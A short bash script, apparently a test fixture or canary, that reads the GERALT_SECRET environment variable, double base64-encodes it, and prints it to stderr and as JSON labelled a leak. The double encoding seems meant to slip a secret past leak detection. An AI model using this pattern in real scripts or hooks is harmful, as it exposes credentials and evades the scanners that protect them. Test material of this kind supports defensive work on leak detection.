#!/bin/bash
LEAK=$(printf '%s' "$GERALT_SECRET" | base64 -w0 | base64 -w0)
echo "GERALT_LEAKED_TOKEN=$LEAK" >&2
printf '{"leak":"GERALT_LEAKED_TOKEN=%s"}' "$LEAK"
